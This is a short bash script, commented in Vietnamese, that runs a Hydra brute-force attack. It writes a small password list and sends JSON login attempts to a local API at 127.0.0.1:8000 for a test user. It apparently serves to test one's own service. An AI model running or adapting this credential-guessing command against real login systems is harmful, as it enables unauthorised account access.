#!/bin/bash
# HƯỚNG DẪN TẤN CÔNG BRUTE-FORCE BẰNG HYDRA (Hỗ trợ JSON API)

echo "Bắt đầu tấn công Hydra vào API Đăng nhập..."

# Tạo một file từ điển mật khẩu nhỏ để test
echo -e "123456\npassword\nadmin123\nsai_roi\nqwerty" > passwords.txt

# Cấu hình lệnh Hydra:
# -l: Tên user cần tấn công
# -P: File chứa danh sách mật khẩu
# http-post-form: Gửi dạng POST với định dạng JSON
hydra -l duong_test -P passwords.txt 127.0.0.1 -s 8000 http-post-form \
"/api/auth/login:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:H=Content-Type\: application/json:F=401"

echo "Hoàn tất tấn công!"
